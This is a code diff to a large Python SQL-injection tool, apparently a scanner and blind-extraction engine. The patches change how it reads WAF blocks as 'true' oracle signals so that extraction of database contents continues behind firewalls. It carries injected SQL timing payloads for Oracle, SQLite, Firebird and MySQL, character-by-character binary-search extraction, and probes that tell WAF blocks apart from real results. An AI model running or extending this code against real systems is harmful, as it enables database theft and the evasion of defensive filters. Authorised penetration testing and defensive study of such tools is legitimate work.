@@ -43697,6 +43697,18 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
             #  Check for WAF block
             if not _validate_response(fp, func_name="waf_block_check"): continue
             if WAFBlockDiscriminator.is_waf_block(fp):
+                # BUG-EXTRACTION-WAF-POLARITY FIX (_extract_int): In inverted-polarity
+                # WAF oracle (True=4xx WAF block / False=app response), the WAF block IS
+                # the TRUE oracle signal.  Treat it as lo=mid+1 and keep narrowing.
+                # Guard: require >= 2 true_sims so polarity has been confirmed by the
+                # calibrator from actual samples before we trust the inversion.
+                if (_BOOL_CALIBRATOR_MODULE is not None and
+                        getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                        len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+                    lo = mid + 1
+                    if hasattr(result, '_extract_int_waf_blocks'):
+                        result._extract_int_waf_blocks = 0
+                    continue
                 # BUG-5-FIX (Req 7): Count consecutive WAF blocks. If >= operator is being
                 # blocked consistently, auto-switch to BETWEEN which WAFs rarely block.
                 # Without this fix, _extract_int returns lo=0 on the first WAF block,
@@ -45657,12 +45669,24 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                 continue
             
             if WAFBlockDiscriminator.is_waf_block(fp):
+                # BUG-EXTRACTION-WAF-POLARITY FIX: In inverted-polarity WAF oracle
+                # (True=4xx WAF block / False=200|404 app response), the WAF block IS
+                # the TRUE oracle signal.  The calibrator captures this via
+                # _polarity_inverted=True (mean_t_sim < mean_f_sim), but is_waf_block()
+                # fires here before is_true() is ever consulted, discarding the signal.
+                # Guard: require >= 2 true_sims so the calibrator has actually seen
+                # enough WAF-block samples to have set polarity reliably.
+                if (_BOOL_CALIBRATOR_MODULE is not None and
+                        getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                        len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+                    lo = pivot
+                    break
                 # Report WAF block for adaptive escalation
                 if hasattr(result, "_adaptive_mgr"):
                     result._adaptive_mgr.report_block()
                 LOG.debug("[Extraction] WAF blocked pivot probe")
                 continue
-            
+
             try:
                 # BUG-BLIND-CHAR-THRESH FIX: use adaptive _char_thresh (from calibrator)
                 # instead of hardcoded 0.80. On dynamic pages CDN tokens can shift body
@@ -45934,6 +45958,14 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                 break
             
             if WAFBlockDiscriminator.is_waf_block(fp):
+                # BUG-EXTRACTION-WAF-POLARITY FIX (binary search): In inverted-polarity
+                # WAF oracle the WAF block IS the TRUE oracle signal — treat it as
+                # lo=mid+1 and continue narrowing rather than breaking out of the loop.
+                if (_BOOL_CALIBRATOR_MODULE is not None and
+                        getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                        len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+                    lo = mid + 1
+                    continue
                 # Report WAF block for adaptive escalation
                 if hasattr(result, "_adaptive_mgr"):
                     result._adaptive_mgr.report_block()
@@ -54865,13 +54897,18 @@ class Scanner:
                     # (Oracle 12c+) which is publicly accessible without elevated privileges.
                     _timing_body = f"; BEGIN DBMS_SESSION.SLEEP({_time_sec}*CASE WHEN [INFERENCE] THEN 1 ELSE 0 END); END"
                 elif _dbms == "SQLite":
-                    # BUG-SQLITE-ZEROBLOB-BOMB FIX: _time_sec*100000000 = up to 300MB
-                    # when _time_sec=3.  This can OOM-kill the target SQLite server.
-                    # Cap ZEROBLOB at 10MB per second × 5s max = 50MB hard ceiling.
-                    # LIKE('X',HEX(RANDOMBLOB(N))) is more reliable than ZEROBLOB
-                    # for timing because SQLite evaluates HEX before LIKE, and the
-                    # LIKE match 'X' always fails → result 0 (no data allocation leak).
-                    _zb_bytes = min(int(_time_sec) * 10_000_000, 50_000_000)
+                    # BUG-SQLITE-ZEROBLOB-BOMB FIX v2 (CRITICAL): Previous cap was 50MB
+                    # (10MB/s × 5s). The actual _SQLITE_BOMB_MAX_BLOB filter threshold is
+                    # 5_000_000 (5 MB). Extraction probes reach _send_injected() which does
+                    # NOT call _is_sqlite_resource_bomb(), so a 50MB RANDOMBLOB goes straight
+                    # to the server — OOM-killing or timing-out real SQLite targets.
+                    # Fix: cap at 4_500_000 (4.5 MB, 10% safety margin below 5 MB threshold),
+                    # matching _time_based_extract_inner SQLite blob sizing and the MSE
+                    # _SLEEP_FN["SQLite"] formula (t*800000 → 2*800000=1.6MB for t=2).
+                    # A 4.5MB RANDOMBLOB gives ~1-4s CPU delay on typical SQLite hardware,
+                    # sufficient for the LIKE('X',HEX(RANDOMBLOB(N))) timing oracle.
+                    # Numeric safety: _zb_bytes is a plain integer literal; only argument size changes.
+                    _zb_bytes = min(int(_time_sec) * 800_000, 4_500_000)  # BUG-SQLITE-ZEROBLOB-BOMB-V2 FIX: was 50MB cap
                     _timing_body = f"; SELECT CASE WHEN ([INFERENCE]) THEN LIKE('X',HEX(RANDOMBLOB({_zb_bytes}))) ELSE 1 END"
                 else:
                     _timing_body = f"; SELECT SLEEP({_time_sec}*([INFERENCE]))"
@@ -54894,8 +54931,10 @@ class Scanner:
                 # BUG-ORACLE-INFERENCE-GRAFT-PRIV FIX: Same privilege fix as above.
                 _timing_body = _body.rsplit("SELECT", 1)[0] + f"BEGIN DBMS_SESSION.SLEEP({_time_sec}*CASE WHEN [INFERENCE] THEN 1 ELSE 0 END); END"
             elif _dbms == "SQLite":
-                # BUG-SQLITE-ZEROBLOB-BOMB-GRAFT FIX: Same 50MB cap as standalone path above.
-                _zb_bytes_g = min(int(_time_sec) * 10_000_000, 50_000_000)
+                # BUG-SQLITE-ZEROBLOB-BOMB-GRAFT-V2 FIX (CRITICAL): Previous cap was 50MB.
+                # Actual _SQLITE_BOMB_MAX_BLOB = 5 MB. Extraction probes bypass the filter.
+                # Fix: apply same 4.5MB cap as standalone path (BUG-SQLITE-ZEROBLOB-BOMB-V2 FIX).
+                _zb_bytes_g = min(int(_time_sec) * 800_000, 4_500_000)  # BUG-SQLITE-ZEROBLOB-BOMB-GRAFT-V2 FIX: was 50MB cap
                 _timing_body = _body.rsplit("SELECT", 1)[0] + f"SELECT CASE WHEN ([INFERENCE]) THEN LIKE('X',HEX(RANDOMBLOB({_zb_bytes_g}))) ELSE 1 END"
             elif _dbms == "Firebird":
                 _timing_body = _body.rsplit("SELECT", 1)[0] + "SELECT CASE WHEN [INFERENCE] THEN (SELECT COUNT(*) FROM RDB$TYPES a, RDB$TYPES b) ELSE 0 END FROM RDB$DATABASE"
@@ -58107,9 +58146,22 @@ class Scanner:
                                   "garbage value %d; returning None", pos, _val)
                         return None
                     elif _char_eq_r is None:
-                        # Equality ambiguous — fall through conservatively (BROAD-4XX)
-                        # Don't reject confirmed bit assembly if equality is indeterminate
-                        pass
+                        # BUG-BITWISE-NONE-FALLTHROUGH FIX (CRITICAL):
+                        # When the assembled value is suspicious (supplementary-plane
+                        # > 0xFFFF or all hex-'8' bits set) AND the equality
+                        # verification probe is ambiguous (BROAD-4XX returns None —
+                        # cannot distinguish WAF-block-of-True from genuine True),
+                        # we CANNOT trust the assembled value.  The previous `pass`
+                        # fell through to the `return chr(_val)` line which returns
+                        # chr(0x88888)=chr(557192) — a supplementary-plane char that
+                        # satisfies 32 <= 557192 <= 1114111 — producing garbage chars
+                        # in extraction output.  Return None so the caller routes to
+                        # _fallback_equality which uses only safe comparison operators.
+                        LOG.debug(
+                            "[Inference] pos=%d bitwise WAF-hex8/supplementary: equality "
+                            "probe None (BROAD-4XX ambiguous for suspicious value %d) "
+                            "— returning None", pos, _val)
+                        return None
 
             # BUG-BITWISE-UNICODE-HI FIX: was `32 <= _val <= 255` — the 255 cap discarded
             # all non-Latin-1 Unicode characters (code points 256-65535 for MSSQL/Sybase,
@@ -60296,6 +60348,41 @@ class Scanner:
                                                         "length %d failed equality verify — capping to "
                                                         "max_len=%d", label, _length, max_len)
                                             _length = min(_length, max_len)
+                                    elif _stab_eq_r is True:
+                                        # BUG-STABILITY-AGREE-NO-RC4B FIX (CRITICAL):
+                                        # When True=4xx oracle (e.g. Imperva True=400),
+                                        # `{_stab_len_fn}={_length}` with a garbage length
+                                        # (e.g. 257) may be blocked by WAF as True — the
+                                        # equality probe returns True but only because WAF
+                                        # blocks ANY equality probe against suspicious values.
+                                        # Run RC-4b counter probes (={-1} and ={99999}) to
+                                        # discriminate real True from WAF-blocked True:
+                                        # if a counter probe ALSO returns True, the WAF is
+                                        # blocking equality indiscriminately → length is garbage.
+                                        _stab_rc4b_neg  = await _eval(f"{_stab_len_fn}=-1")
+                                        _stab_rc4b_huge = await _eval(f"{_stab_len_fn}=99999")
+                                        if _stab_rc4b_neg is True or _stab_rc4b_huge is True:
+                                            # Counter probe returned True → WAF blocking equality
+                                            # → agreed length is garbage; cap to max_len.
+                                            LOG.warning(
+                                                "[Inference] %s: stability: equality True but RC-4b "
+                                                "counter probe also True (WAF blocks equality) — "
+                                                "length %d is garbage; capping to max_len=%d",
+                                                label, _length, max_len)
+                                            _length = min(_length, max_len)
+                                        # else: both counter probes returned False → True on
+                                        # _length IS real → length is correct, keep as-is.
+                                    elif _stab_eq_r is None:
+                                        # BUG-STABILITY-AGREE-BROADBLOCK FIX (CRITICAL):
+                                        # BROAD-4XX ambiguity: equality probe indeterminate
+                                        # (WAF blocks both True AND False probes so oracle
+                                        # cannot distinguish).  Cannot trust the agreed
+                                        # suspicious value — cap to max_len conservatively.
+                                        LOG.warning(
+                                            "[Inference] %s: stability: equality probe None "
+                                            "(BROAD-4XX ambiguous) for suspicious length %d "
+                                            "— capping to max_len=%d", label, _length, max_len)
+                                        _length = min(_length, max_len)
                         else:
                             # Second run failed — oracle may be degraded; cap to max_len
                             _length = min(_length, max_len)
@@ -111439,6 +111526,8 @@ class TechniqueCascadeEngine:
         # that mirrors the baseline (path-injection reversed-polarity pattern).
         _d_status_oracle = False           # true-probe ≠ baseline, false-probe = baseline
         _d_status_oracle_reversed = False  # true-probe = baseline, false-probe ≠ baseline
+        _d_status_waf_oracle = False       # true-probe = True-oracle-status (4xx), false differs
+        _d_status_waf_oracle_reversed = False  # false-probe = True-oracle-status (4xx), true differs
         # BUG-R3-A FIX: Skip Check D entirely for timing techniques (T, TH, HQ, BT).
         # SLEEP/pg_sleep/WAITFOR/RANDOMBLOB never changes HTTP response headers between
         # a true-condition and a false-condition probe — the DB executes the sleep and
@@ -111556,12 +111645,48 @@ class TechniqueCascadeEngine:
                         _d_st_f not in _WAF_4XX_CODES and
                         _d_st_t not in _WAF_4XX_CODES
                     )
+                    # BUG-CHECKD-WAF4XX-ORACLE FIX (CRITICAL):
+                    # For True=WAF-4xx oracle (e.g. Imperva True=400/False=404),
+                    # _d_status_oracle and _d_status_oracle_reversed both fail because
+                    # they require `_d_st_t not in _WAF_4XX_CODES`.  For True=400,
+                    # _d_st_t=400 IS in _WAF_4XX_CODES → both conditions are always False
+                    # → Check D status-oracle confirmation at line ~114787 never fires.
+                    # Yet when the SUBSTRING true canary returns 400 (WAF blocks it) and
+                    # the false canary returns 404 (app responds), this is direct evidence
+                    # of SQL-conditional WAF blocking — the strongest boolean signal.
+                    # Fix: add WAF-specific oracle conditions that use the calibrated
+                    # _pcv_bool_true_status (set from the detection replay response) to
+                    # recognise True=4xx oracle divergence as genuine injection evidence.
+                    _d_status_waf_oracle = (
+                        _pcv_bool_true_is_4xx
+                        and _pcv_bool_true_status is not None
+                        and _d_st_t > 0 and _d_st_f > 0
+                        and _d_st_t == _pcv_bool_true_status
+                        and _d_st_f != _pcv_bool_true_status
+                    )
+                    _d_status_waf_oracle_reversed = (
+                        _pcv_bool_true_is_4xx
+                        and _pcv_bool_true_status is not None
+                        and _d_st_t > 0 and _d_st_f > 0
+                        and _d_st_f == _pcv_bool_true_status
+                        and _d_st_t != _pcv_bool_true_status
+                    )
                     if _d_status_oracle:
                         _d_pass = True
                         _d_headers.append(f"status-oracle(true={_d_st_t},false={_d_st_f},bl={_d_bl_sts})")
                     elif _d_status_oracle_reversed:
                         _d_pass = True
                         _d_headers.append(f"status-oracle-rev(true={_d_st_t},false={_d_st_f},bl={_d_bl_sts})")
+                    elif _d_status_waf_oracle:
+                        _d_pass = True
+                        _d_headers.append(
+                            f"waf-oracle(true={_d_st_t}=={_pcv_bool_true_status},"
+                            f"false={_d_st_f},bl={_d_bl_sts})")
+                    elif _d_status_waf_oracle_reversed:
+                        _d_pass = True
+                        _d_headers.append(
+                            f"waf-oracle-rev(false={_d_st_f}=={_pcv_bool_true_status},"
+                            f"true={_d_st_t},bl={_d_bl_sts})")
                     # BUG-D2 FIX: Exclude dynamic-only headers from security-diff count.
                     # content-length/etag vary on dynamic pages without injection (CSRF tokens,
                     # timestamps) → false positives.  Require 2+ SECURITY-relevant diffs
@@ -112138,7 +112263,27 @@ class TechniqueCascadeEngine:
         # Guard: when all Check A canaries are WAF-blocked, the 4xx baseline is WAF-forced,
         # so treat the page as live (not an error page) regardless of status/size.
         _waf_forced_clean_block = _check_a_all_waf_blocked and _bl_status in range(400, 600)
-        _is_error_page = _bl_status >= 400 and _bl_size < 100000 and not _waf_forced_clean_block
+        # BUG-IS-ERROR-PAGE-FALSE-ORACLE-BASELINE FIX (CRITICAL):
+        # When True=4xx oracle (e.g. Imperva True=400/False=404), the clean baseline
+        # probe returns the FALSE-oracle status (e.g. 404) because no injection payload
+        # is active.  The existing `_bl_status >= 400` condition fires for baseline=404,
+        # incorrectly classifying the False-oracle baseline as an error page and rejecting
+        # ALL genuine detections on such targets with "REJECTED error page (404, 1245B)".
+        # Fix: when _pcv_bool_true_is_4xx=True, the baseline status that is NOT the True
+        # oracle status is the expected False-oracle state — not a real application error.
+        # Do NOT set _is_error_page in that case so downstream confirmation paths can fire.
+        _false_oracle_baseline = (
+            _pcv_bool_true_is_4xx
+            and _pcv_bool_true_status is not None
+            and _bl_status >= 400
+            and _bl_status != _pcv_bool_true_status
+        )
+        _is_error_page = (
+            _bl_status >= 400
+            and _bl_size < 100000
+            and not _waf_forced_clean_block
+            and not _false_oracle_baseline
+        )
         
         if _a_strong:
             if tech in ("S", "HQ", "DS"):
@@ -114784,14 +114929,76 @@ class TechniqueCascadeEngine:
         # status codes for the same path) and is direct evidence of SQL-conditional routing.
         # Safety: requires non-timing technique to prevent timing-induced status code changes
         # from being misclassified (SLEEP can cause 504 on some servers).
-        if (_d_pass and (_d_status_oracle or _d_status_oracle_reversed)
+        if (_d_pass and (_d_status_oracle or _d_status_oracle_reversed
+                         or _d_status_waf_oracle or _d_status_waf_oracle_reversed)
                 and not _timing_only_tech
                 and tech not in ("S", "HQ", "T", "BT", "TH", "DS")):
-            _so_type = "status-oracle" if _d_status_oracle else "status-oracle-reversed"
+            if _d_status_oracle:
+                _so_type = "status-oracle"
+            elif _d_status_oracle_reversed:
+                _so_type = "status-oracle-reversed"
+            elif _d_status_waf_oracle:
+                _so_type = "waf-status-oracle"
+            else:
+                _so_type = "waf-status-oracle-reversed"
             _so_detail = _d_headers[0] if _d_headers else f"true={_d_st_t},false={_d_st_f}"
             print(f"[*]   [PCV] Result: CONFIRMED  Check D {_so_type} — SQL-conditional "
                   f"routing change ({_so_detail}) proves boolean injection "
                   f"[tech={tech} dbms={dbms} baseline={_bl_status}]", flush=True)
+            if det is not None:
+                try:
+                    det._pcv_verified = True
+                    if hasattr(det, 'detection') and det.detection is not None:
+                        det.detection._pcv_verified = True
+                except Exception:
+                    pass
+            _INJECTION_CONFIRMED[0] = True
+            _SCAN_STOPPED[0] = True
+            return True, 2, _details
+
+        # BUG-DETREPLAY-WAF-ORACLE-NO-CHECKA-WAF-BLOCK FIX (CRITICAL):
+        # For True=WAF-4xx oracle (e.g. Imperva True=400/False=404), Check A canary
+        # probes (plain SUBSTRING SQL) may not be WAF-blocked because the WAF only
+        # blocks bypass-mutated payloads in certain parameters, or detects injection
+        # by SQL RESULT (response size/content change) rather than SQL keywords.
+        # In that case _check_a_all_waf_blocked=False and the existing WAF-bypass
+        # replay block at line ~112672 never fires. Yet _det_fp (precomputed from the
+        # exact detection payload replay) provides DIRECT oracle evidence:
+        #   - det_status == _pcv_bool_true_status: replay returns True-oracle state
+        #   - det_sim < threshold: body genuinely different from baseline
+        #   - fp_false.status_code != _pcv_bool_true_status: False payload does NOT
+        #     trigger the True-oracle status, eliminating the WAF-always-blocks FP case
+        #     where a WAF blocks all SQL regardless of truth value (in that case,
+        #     both True and False payloads would return the same 4xx status).
+        # Safety guards:
+        #   1. _det_sim < threshold: body genuinely changed (not WAF noise)
+        #   2. fp_false.status_code != _pcv_bool_true_status: FALSE condition returns
+        #      different status — proves oracle is SQL-conditional, not blanket WAF block
+        #   3. not _check_a_all_waf_blocked: distinct from the existing WAF-bypass path
+        #   4. not _a_pass: only fire when Check A couldn't confirm (redundant safety)
+        _det_waf_oracle_replay_eligible = (
+            not _a_pass
+            and not _timing_only_tech
+            and tech not in ("S", "HQ", "T", "BT", "TH", "DS", "SO")
+            and not _check_a_all_waf_blocked  # distinct from the _check_a_all_waf_blocked path
+            and _use_exact_payload
+            and _pcv_bool_true_is_4xx
+            and _pcv_bool_true_status is not None
+            and _det_fp is not None
+            and _det_status == _pcv_bool_true_status
+            and _det_sim < (1.0 - max(_gap_threshold, 0.25))
+            and fp_false is not None
+            and getattr(fp_false, 'status_code', 0) != _pcv_bool_true_status
+        )
+        if _det_waf_oracle_replay_eligible:
+            _det_false_sts = getattr(fp_false, 'status_code', 0)
+            print(f"[*]   [PCV] Result: CONFIRMED  WAF-oracle direct detection replay "
+                  f"(det_status={_det_status}=={_pcv_bool_true_status}=True-oracle, "
+                  f"false_status={_det_false_sts}≠{_pcv_bool_true_status}, "
+                  f"det_sim={_det_sim:.3f} < {1.0-max(_gap_threshold,0.25):.3f}) "
+                  f"— exact detection bypass payload produces True-oracle; False payload "
+                  f"does not; SQL-conditional WAF blocking confirmed "
+                  f"[tech={tech} dbms={dbms}]", flush=True)
             if det is not None:
                 try:
                     det._pcv_verified = True
@@ -145197,6 +145404,15 @@ class ChameleonExtractor:
     async def probe_bool(self, condition: str, dbms: str) -> bool:
         """Public boolean oracle for a condition string."""
         sim = await self._probe_condition(condition, dbms)
+        # BUG-EXTRACTION-WAF-POLARITY FIX (ChameleonExtractor): For inverted-polarity
+        # WAF oracle (True=WAF block / False=app response), WAF block bodies produce
+        # LOW SimHash similarity against the clean baseline — so `sim > thresh` returns
+        # False for TRUE oracle signals (wrong direction).  Delegate to the calibrator's
+        # is_true() which flips the comparison when _polarity_inverted=True.
+        if (_BOOL_CALIBRATOR_MODULE is not None and
+                getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+            return _BOOL_CALIBRATOR_MODULE.is_true(sim)
         return sim > self._sim_thresh
 
     async def extract_char_bsearch(self, sql_query: str, pos: int, dbms: str) -> Optional[str]:
@@ -145874,7 +146090,15 @@ class AdaptiveFrequencyExtractor:
         if not fp or not fp.body:
             return False
         norm_probe  = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
-        return SimHasher.body_similarity(_ns, norm_probe) > self._sim_thresh
+        _afe_sim = SimHasher.body_similarity(_ns, norm_probe)
+        # BUG-EXTRACTION-WAF-POLARITY FIX (AdaptiveFrequencyExtractor): For inverted-polarity
+        # WAF oracle (True=WAF block / False=app response), WAF block bodies produce LOW
+        # similarity against the clean baseline — `sim > thresh` returns False for TRUE signals.
+        if (_BOOL_CALIBRATOR_MODULE is not None and
+                getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+            return _BOOL_CALIBRATOR_MODULE.is_true(_afe_sim)
+        return _afe_sim > self._sim_thresh
 
     async def extract_char(self, char_func: str, col_key: str = "") -> Optional[str]:
         """
@@ -147299,7 +147523,24 @@ class StackedQueryExtractor:
             elif self.dbms == "SQLite":
                 # BUG-STACKED-SQLITE-FIX: SQLite was entirely unhandled (returned None)
                 char_func = f"COALESCE(UNICODE(SUBSTR((SELECT * FROM {_stacked_eff_table} LIMIT 1),{pos},1)),0)"
-                sleep_func = "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000))))"
+                # BUG-STACKED-SQLITE-BOMB FIX (CRITICAL, SQLite; StackedQueryExtractor;
+                # S/DS techniques; all surfaces):
+                # The old sleep_func used RANDOMBLOB(300000000) = 300 MB. The
+                # _SQLITE_BOMB_MAX_BLOB filter threshold is 5_000_000 (5 MB).
+                # Unlike detection probes (which go through _get_cascade_payloads() that
+                # calls _is_sqlite_resource_bomb() before sending), extraction probes go
+                # directly through StackedQueryExtractor._send() → _send_injected() which
+                # does NOT call _is_sqlite_resource_bomb(). So the 300 MB payload was
+                # sent directly to the target server, causing OOM/crash on SQLite targets
+                # and wasting probe budget.
+                # Fix: cap at 1_600_000 bytes (1.6 MB ≈ 1-2s CPU delay, well below the
+                # 5 MB filter threshold). Matches the _SLEEP_FN["SQLite"] formula at t=2:
+                # RANDOMBLOB(t*800000) = 2*800000 = 1,600,000. The 1500ms timing threshold
+                # in the oracle check below is sufficient to detect a 1-2s sleep signal.
+                # Numeric safety: _sqlite_blob is a plain integer literal; only the numeric
+                # argument to RANDOMBLOB() is changed; SQL structure is untouched.
+                _sqlite_blob = min(int(2 * 800_000), 4_500_000)  # 1.6 MB, safely below 5 MB bomb filter
+                sleep_func = f"LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({_sqlite_blob}))))"
                 # BUG-STACKED-SQLITE-LOW32-FIX: was low=32, which caused the `char_value < 32`
                 # EOS guard below to trigger on any control character (newline=10, tab=9, null=0),
                 # silently truncating strings at the first non-printable character.  low=0 matches
@@ -149004,6 +149245,13 @@ class ExtractionOrchestrator:
                     _ref = (_interp_live_norm if _interp_live_norm else
                             ResponseNormaliser.normalise(_baseline_body))
                     _sim = SimHasher.body_similarity(_ref, _norm)
+                    # BUG-EXTRACTION-WAF-POLARITY FIX (_interp_oracle): For inverted-polarity
+                    # WAF oracle (True=WAF block / False=app response), WAF block bodies produce
+                    # LOW similarity — `_sim > 0.65` returns False for TRUE signals.
+                    if (_BOOL_CALIBRATOR_MODULE is not None and
+                            getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                            len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+                        return _BOOL_CALIBRATOR_MODULE.is_true(_sim)
                     return _sim > 0.65
 
                 _isearch = InterpolationSearchExtractor(_interp_oracle, context="data")
@@ -150672,7 +150920,16 @@ class RobustExtractor:
                 _rp_thresh = max(0.60, min(0.85, _rp_cal))
         except Exception:
             _rp_thresh = 0.75
-        return _sim_to_baseline(fp, self.baseline) >= _rp_thresh
+        _rp_sim = _sim_to_baseline(fp, self.baseline)
+        # BUG-EXTRACTION-WAF-POLARITY FIX (RobustExtractor): For inverted-polarity WAF
+        # oracle (True=WAF block / False=app response), WAF block bodies produce LOW
+        # similarity against the clean baseline — `sim >= thresh` returns False for TRUE
+        # signals.  Delegate to calibrator's is_true() when polarity inversion is confirmed.
+        if (_BOOL_CALIBRATOR_MODULE is not None and
+                getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+            return _BOOL_CALIBRATOR_MODULE.is_true(_rp_sim)
+        return _rp_sim >= _rp_thresh
 
     async def _extract_hex_char(self, sql: str, pos: int) -> Optional[str]:
         """
@@ -161705,6 +161962,13 @@ class AdaptiveFrequencyExtractorV18(AdaptiveFrequencyExtractor):
             else:
                 _baseline_body_normalised = ResponseNormaliser.normalise(_baseline_body)
             sim  = SimHasher.body_similarity(_baseline_body_normalised, norm)
+            # BUG-EXTRACTION-WAF-POLARITY FIX (_probe_char_equals): For inverted-polarity
+            # WAF oracle, WAF block bodies produce LOW sim — `sim > thresh` returns False
+            # for TRUE signals.  Delegate to calibrator when polarity inversion confirmed.
+            if (_BOOL_CALIBRATOR_MODULE is not None and
+                    getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                    len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+                return _BOOL_CALIBRATOR_MODULE.is_true(sim)
             return sim > self._sim_thresh
         except Exception:
             return False
@@ -161886,7 +162150,17 @@ class AdaptiveFrequencyExtractorV18(AdaptiveFrequencyExtractor):
                     continue
                 norm = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
                 sim  = SimHasher.body_similarity(norm_base, norm)
-                if sim > self._sim_thresh:
+                # BUG-EXTRACTION-WAF-POLARITY FIX (_freq_binary_search): For inverted-polarity
+                # WAF oracle, WAF block bodies produce LOW sim — `sim > thresh` returns False
+                # for TRUE signals.  Delegate to calibrator when polarity inversion confirmed.
+                _fbs_is_true: bool
+                if (_BOOL_CALIBRATOR_MODULE is not None and
+                        getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                        len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+                    _fbs_is_true = _BOOL_CALIBRATOR_MODULE.is_true(sim)
+                else:
+                    _fbs_is_true = sim > self._sim_thresh
+                if _fbs_is_true:
                     lo = mid + 1
                 else:
                     hi = mid
@@ -169685,7 +169959,16 @@ class AdaptiveBinarySearchExtractor:
             raise asyncio.CancelledError(
                 "ConditionalErrorOracle._probe: gate-blocked dead fingerprint — "
                 "aborting extraction to prevent all-spaces corruption")
-        result = _sim_to_baseline(fp, self.baseline) > self._probe_threshold
+        _abse_sim = _sim_to_baseline(fp, self.baseline)
+        # BUG-EXTRACTION-WAF-POLARITY FIX (AdaptiveBinarySearchExtractor): For inverted-
+        # polarity WAF oracle (True=WAF block / False=app response), WAF block bodies
+        # produce LOW similarity — `sim > threshold` returns False for TRUE signals.
+        if (_BOOL_CALIBRATOR_MODULE is not None and
+                getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False) and
+                len(getattr(_BOOL_CALIBRATOR_MODULE, 'true_sims', ())) >= 2):
+            result = _BOOL_CALIBRATOR_MODULE.is_true(_abse_sim)
+        else:
+            result = _abse_sim > self._probe_threshold
         self._cache[_key] = result
         return result
 
